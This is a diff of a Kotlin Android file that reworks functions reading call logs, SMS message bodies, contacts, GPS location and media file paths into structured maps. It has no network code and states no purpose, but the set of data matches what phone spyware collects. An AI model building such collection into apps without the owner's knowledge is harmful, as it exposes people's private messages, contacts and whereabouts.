@@ -11,10 +11,12 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import androidx.core.app.ActivityCompat
+import java.text.SimpleDateFormat
+import java.util.*
 
-// Retrieve call logs
-fun getCallLogs(context: Context): String {
-    val callLogsList = StringBuilder()
+// Retrieve call logs in a structured format
+fun getCallLogs(context: Context): List<Map<String, String>> {
+    val callLogsList = mutableListOf<Map<String, String>>()
     val cursor: Cursor? = context.contentResolver.query(
         CallLog.Calls.CONTENT_URI,
         null,
@@ -31,17 +33,24 @@ fun getCallLogs(context: Context): String {
         while (it.moveToNext()) {
             val number = it.getString(numberIndex)
             val type = it.getString(typeIndex)
-            val date = it.getString(dateIndex)
-            callLogsList.append("Number: $number, Type: $type, Date: $date\n")
+            val dateMillis = it.getLong(dateIndex)
+            val formattedDate = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssZ", Locale.getDefault()).format(Date(dateMillis))
+
+            callLogsList.add(
+                mapOf(
+                    "number" to number,
+                    "type" to type,
+                    "date" to formattedDate
+                )
+            )
         }
     }
-    return callLogsList.toString()
+    return callLogsList
 }
 
-// Retrieve SMS logs
-// Retrieve a limited number of SMS logs
-fun getSMSLogs(context: Context, limit: Int = 100): String {
-    val smsList = StringBuilder()
+// Retrieve SMS logs in a structured format
+fun getSMSLogs(context: Context, limit: Int = 100): List<Map<String, String>> {
+    val smsList = mutableListOf<Map<String, String>>()
     val uri: Uri = Uri.parse("content://sms")
     val cursor: Cursor? = context.contentResolver.query(
         uri,
@@ -59,17 +68,21 @@ fun getSMSLogs(context: Context, limit: Int = 100): String {
         while (it.moveToNext() && count < limit) {
             val address = it.getString(addressIndex)
             val body = it.getString(bodyIndex)
-            smsList.append("From: $address, Message: $body\n")
+            smsList.add(
+                mapOf(
+                    "from" to address,
+                    "message" to body
+                )
+            )
             count++
         }
     }
-    return smsList.toString()
+    return smsList
 }
 
-
-// Retrieve contacts
-fun getContacts(context: Context): String {
-    val contactsList = StringBuilder()
+// Retrieve contacts in a structured format
+fun getContacts(context: Context): List<Map<String, String>> {
+    val contactsList = mutableListOf<Map<String, String>>()
     val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
     val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)
 
@@ -80,14 +93,19 @@ fun getContacts(context: Context): String {
         while (it.moveToNext()) {
             val name = it.getString(nameIndex)
             val number = it.getString(numberIndex)
-            contactsList.append("Name: $name, Number: $number\n")
+            contactsList.add(
+                mapOf(
+                    "name" to name,
+                    "number" to number
+                )
+            )
         }
     }
-    return contactsList.toString()
+    return contactsList
 }
 
-// Retrieve location
-fun getLocation(context: Context): String {
+// Retrieve location in a structured format
+fun getLocation(context: Context): Map<String, Double> {
     val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
 
     if (ActivityCompat.checkSelfPermission(
@@ -95,18 +113,18 @@ fun getLocation(context: Context): String {
             Manifest.permission.ACCESS_FINE_LOCATION
         ) != PackageManager.PERMISSION_GRANTED
     ) {
-        return "Permission not granted"
+        return mapOf("latitude" to 0.0, "longitude" to 0.0)
     }
 
     val location: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
     return location?.let {
-        "Latitude: ${it.latitude}, Longitude: ${it.longitude}"
-    } ?: "Location not available"
+        mapOf("latitude" to it.latitude, "longitude" to it.longitude)
+    } ?: mapOf("latitude" to 0.0, "longitude" to 0.0)
 }
 
-// Retrieve media files
-fun getMediaFiles(context: Context): List<String> {
-    val mediaFiles = mutableListOf<String>()
+// Retrieve media files in a structured format
+fun getMediaFiles(context: Context): List<Map<String, String>> {
+    val mediaFiles = mutableListOf<Map<String, String>>()
 
     // Get images
     val imageCursor: Cursor? = context.contentResolver.query(
@@ -121,7 +139,7 @@ fun getMediaFiles(context: Context): List<String> {
         val dataIndex = it.getColumnIndex(MediaStore.Images.Media.DATA)
         while (it.moveToNext()) {
             val imagePath = it.getString(dataIndex)
-            mediaFiles.add("Image: $imagePath")
+            mediaFiles.add(mapOf("type" to "image", "path" to imagePath))
         }
     }
 
@@ -138,7 +156,7 @@ fun getMediaFiles(context: Context): List<String> {
         val dataIndex = it.getColumnIndex(MediaStore.Video.Media.DATA)
         while (it.moveToNext()) {
             val videoPath = it.getString(dataIndex)
-            mediaFiles.add("Video: $videoPath")
+            mediaFiles.add(mapOf("type" to "video", "path" to videoPath))
         }
     }
 
@@ -155,7 +173,7 @@ fun getMediaFiles(context: Context): List<String> {
         val dataIndex = it.getColumnIndex(MediaStore.Audio.Media.DATA)
         while (it.moveToNext()) {
             val audioPath = it.getString(dataIndex)
-            mediaFiles.add("Audio: $audioPath")
+            mediaFiles.add(mapOf("type" to "audio", "path" to audioPath))
         }
     }
 
